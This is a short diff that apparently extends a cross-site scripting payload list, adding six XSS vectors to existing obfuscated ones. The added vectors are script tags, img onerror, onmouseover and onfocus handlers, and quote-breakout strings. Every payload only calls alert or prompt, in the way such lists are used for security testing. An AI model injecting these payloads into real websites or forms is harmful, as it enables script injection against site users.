@@ -72,3 +72,9 @@ confirm?.(1)
 ''.replace.call`1${/.../}${alert}`
 <h1/%6f%6e/oNclicK=alert`hacked`>CLICK HERE 
 %3Cinput%20type=text%20value=jaVasCript:/*-/*`/*\`/*%27/*%22/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E\x3csVg/%3CsVg/oNloAd=alert()//%3E\x3e%3E%3C/input%3E
+"><img src=x onerror=prompt(1337)>
+"><script>alert(1337)</script>
+<div/onmouseover='alert(1)'> style="x:">
+\";alert('XSS');//
+"autofocus/onfocus=alert(1)//
+'-alert(1)-'
